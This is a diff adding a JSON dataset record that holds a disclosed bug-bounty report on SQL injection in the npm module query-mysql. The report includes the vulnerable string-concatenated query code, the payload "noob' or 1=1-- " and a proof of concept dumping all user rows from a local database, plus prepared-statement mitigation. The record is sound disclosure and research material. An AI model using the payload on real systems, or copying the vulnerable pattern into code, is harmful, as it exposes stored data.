@@ -1,0 +1,45 @@
+{
+  "reported_to": "Node.js third-party modules",
+  "reported_by": "bl4de ",
+  "title": "[query-mysql] SQL Injection due to lack of user input sanitization allows to run arbitrary SQL queries when fetching data from database",
+  "content": "\nHi Guys,\nThere is SQL Injection in query-mysql module. Due to lack of sanitization of user input, an attacker is able to craft SQL query and get any data from the database.\nModule\nquery-mysql\nInstall this module in your project like dependency\nhttps://www.npmjs.com/package/query-mysql\nversion: 0.0.2\nStats\n0 downloads in the last day\n13 downloads in the last week\n85 downloads in the last month\n~1000 estimated downloads per year\nDescription\nMost of functions in query-mysql module used to manipulate data build query usign simple string concatenation. This leads to SQL Injection vulnerability, because an attacker is able to pass his own query and run any SQL on the database.\nThis is one of those functions, which allows to select record from the table depends on value for the column:\nCode 736 Bytes\n1// node_modules/query-mysql/lib/base.js, line 172\n2    fetchById: function (table, id, name_id, callback) {\n3        connect(function (connected) {\n4            if (connected) {\n5\n6                connection.query(\"SELECT * FROM \" + table + \" WHERE \" +name_id+\"='\"+ id+\"'\", function (err, rows, fields) {\n7                    connection.end();\n8                    console.log(\"fetchById\");\n9                    //if (err) throw err;\n10                    if (err) {\n11                        callback(\"error\", null);\n12                    }else{\t\t\t\t\t\t\n13                        callback(\"success\", rows);\n14                    };\n15                })\n16\n17            }else{\n18                callback(\"error_connection\", null);\n19            };\n20        })\n21    },\nThe query itself is simple string with values passed by the user concatenated with SQL:\nCode 75 Bytes\n1connection.query(\"SELECT * FROM \" + table + \" WHERE \" +name_id+\"='\"+ id+\"'\"\nIf we assume, that table, name_id and id will be passed as, respectively, users, id and 1, we should get following query:\nCode 32 Bytes\n1SELECT * FROM users WHERE id='1'\nIt returns record from table users, where id equals 1.\nNow, if we pass in id malicious query, like 1\\' OR 1=1-- - we get this:\nCode 42 Bytes\n1SELECT * FROM users WHERE id='1' OR 1=1-- \nThis query returns all records from table users\nMitigation\nquery-mysql relies on mysql module. This module allows to use Preparing Queries (Prepared Statements) - https://www.npmjs.com/package/mysql#preparing-queries:\nCode 479 Bytes\n1You can use mysql.format to prepare a query with multiple insertion points, utilizing the proper escaping for ids and values. A simple example of this follows:\n2\n3var sql = \"SELECT * FROM ?? WHERE ?? = ?\";\n4var inserts = ['users', 'id', userId];\n5sql = mysql.format(sql, inserts);\n6\n7Following this you then have a valid, escaped query that you can then send to the database safely. This is useful if you are looking to prepare the query before actually sending it to the database. As \nThis is the simplest way to avoid simple SQL Injection vulnerabilites.\nSteps To Reproduce:\ninstall query-mysql module:\nCode 25 Bytes\n1$ npm install query-mysql\nlog in to your local MySQL instance and create database test using following SQL:\nCode 313 Bytes\n1-- Table structure for table `users`\n2\n3DROP TABLE IF EXISTS `users`;\n4/*!40101 SET @saved_cs_client     = @@character_set_client */;\n5/*!40101 SET character_set_client = utf8 */;\n6CREATE TABLE `users` (\n7  `username` varchar(50) DEFAULT NULL,\n8  `password` varchar(50) DEFAULT NULL\n9) ENGINE=InnoDB DEFAULT CHARSET=utf8;\npopulate data by adding couple of records:\nCode 220 Bytes\n1mysql> select * from users;\n2+----------+----------+\n3| username | password |\n4+----------+----------+\n5| admin    | admin    |\n6| user     | user     |\n7| noob     | noob     |\n8+----------+----------+\n93 rows in set (0.00 sec)\ncreate sample application:\nCode 260 Bytes\n1// app.js\n2'use strict'\n3\n4const query = require('query-mysql')\n5\n6query.configure({\n7  'host': '127.0.0.1',\n8  'user': 'root',\n9  'password': 'root',\n10  'database': 'test'\n11})\n12\n13query.base.fetchById('users', 'noob', 'username', (msg, res) => {\n14  console.log(msg, res)\n15})\nrun application:\nCode 13 Bytes\n1$ node app.js\nresult:\nCode 74 Bytes\n1fetchById\n2success [ RowDataPacket { username: 'noob', password: 'noob' } ]\nNow, modify query into following one:\nCode 140 Bytes\n1// app.js\n2//... cut for readibility\n3query.base.fetchById('users', 'noob\\' or 1=1-- ', 'username', (msg, res) => {\n4  console.log(msg, res)\n5})\nrun application again:\nCode 13 Bytes\n1$ node app.js\nthis time result set contains all records from table users:\nCode 188 Bytes\n1fetchById\n2success [ RowDataPacket { username: 'admin', password: 'admin' },\n3  RowDataPacket { username: 'user', password: 'user' },\n4  RowDataPacket { username: 'noob', password: 'noob' } ]\nOther functions in query-mysql module contains the same vulnerability.\nSupporting Material/References:\nmacOS 10.13.3\nChromium 66.0.3333.0 (Developer Build) (64-bit)\nNode.js version: v8.9.3\nnpm version: 5.5.1\nmysql Ver 14.14 Distrib 5.7.13, for osx10.11 (x86_64)\nPlease feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.\nI hope my report will help to keep Node.js ecosystem and its users safe in the future.\nRegards,\nRafal 'bl4de' Janicki\nImpact\nThis vulnerability allows malicious user to fetch/manipulate data in database\n\n",
+  "severity": [
+    9.8,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "SQL Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1526748780,
+  "report_url": "https://hackerone.com/reports/311244",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Install query-mysql module: npm install query-mysql"
+    ],
+    [
+      2,
+      "Run a malicious query by passing SQL injection payload in the id parameter: query.base.fetchById('users', 'noob\\' or 1=1-- ', 'username', callback)"
+    ]
+  ],
+  "vuln_description": "SQL Injection vulnerability in query-mysql module due to lack of user input sanitization, allowing attackers to execute arbitrary SQL queries by manipulating input parameters.",
+  "reason": "The vulnerability is straightforward to exploit as it involves basic SQL injection techniques without requiring complex interactions or state manipulation. The attack vector is direct and well-documented in security contexts.",
+  "new_complexity": "LOW",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": true
+  },
+  "authnz_metadata": {
+    "reason": "The SQL Injection vulnerability described in the report is due to improper sanitization of user inputs in the query-mysql module, allowing arbitrary SQL execution. The proposed methodologies focus on authentication and authorization bypasses (AuthN/AuthZ) and Insecure Direct Object References (IDOR) by manipulating user sessions and resource IDs. However, SQL Injection is a different class of vulnerability that stems from improper input handling in database queries, not from authorization or authentication flaws. Therefore, the methodologies described would not detect this vulnerability as they are not designed to test for input sanitization or SQL query construction issues.",
+    "is_detectable": false
+  }
+}
